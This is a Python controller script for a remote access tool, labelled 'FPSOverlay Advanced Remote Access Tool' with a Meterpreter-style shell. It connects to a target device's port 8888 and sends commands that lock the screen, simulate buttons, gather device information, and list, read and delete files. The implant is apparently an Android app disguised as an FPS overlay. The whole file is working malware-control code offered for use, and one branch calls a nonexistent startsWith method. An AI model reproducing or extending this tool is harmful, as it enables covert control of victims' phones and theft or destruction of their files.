import socket
import sys
import os

def send_command(ip, port, cmd):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect((ip, port))
            s.sendall((cmd + "\n").encode())

            # Mendukung response yang panjang (seperti LS)
            data = b""
            while True:
                part = s.recv(4096)
                data += part
                if len(part) < 4096:
                    break
            return data.decode().strip()
    except Exception as e:
        return f"Error: {e}"

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
    \033[91m
     _  _  ____  ____    ___   __   __ _  ____  __   __    ____
    ( \/ )(  _ \(  _ \  / __) /  \ (  ( \/ ___)/  \ (  )  (  __)
     )  (  ) __/ )   / ( (__ (  O )/    /\___ \  O )/ (_/\ ) _)
    (_/\_)(__)  (__\_)  \___) \__/ \_)__)(____/\__/ \____/(____)
    \033[0m
    [+] FPSOverlay Advanced Remote Access Tool
    [+] Mode: Meterpreter-Style Shell
    """)

def main():
    if len(sys.argv) < 2:
        target_ip = input("\033[92m[?]\033[0m Enter Target IP: ")
    else:
        target_ip = sys.argv[1]

    print_banner()
    current_dir = send_command(target_ip, 8888, "PWD")

    while True:
        try:
            prompt = f"\033[94mrat\033[0m:\033[91m{current_dir}\033[0m > "
            cmd_input = input(prompt).strip()

            if not cmd_input:
                continue

            cmd_upper = cmd_input.upper()

            if cmd_upper == "HELP":
                print("""
                Core Commands
                =============
                LOCK/UNLOCK    Toggle screen overlay
                VIBRATE        Device vibration
                HOME/BACK      Simulate hardware buttons
                INFO           Get device hardware info
                SCREEN         Get foreground app
                MESSAGE <text> Show Toast message

                File System Commands
                ====================
                LS             List files in current directory
                CD <dir>       Change directory
                PWD            Print current path
                CAT <file>     Read file content
                RM <file>      Delete file

                System Commands
                ===============
                CLEAR          Clear terminal screen
                EXIT           Terminate session
                """)
            elif cmd_upper == "CLEAR":
                os.system('clear' if os.name == 'posix' else 'cls')
            elif cmd_upper == "EXIT":
                break
            elif cmd_upper.startsWith("CD "):
                res = send_command(target_ip, 8888, cmd_input)
                print(res)
                current_dir = send_command(target_ip, 8888, "PWD")
            else:
                res = send_command(target_ip, 8888, cmd_input)
                print(res)

        except KeyboardInterrupt:
            print("\n[*] Session closed.")
            break

if __name__ == "__main__":
    main()
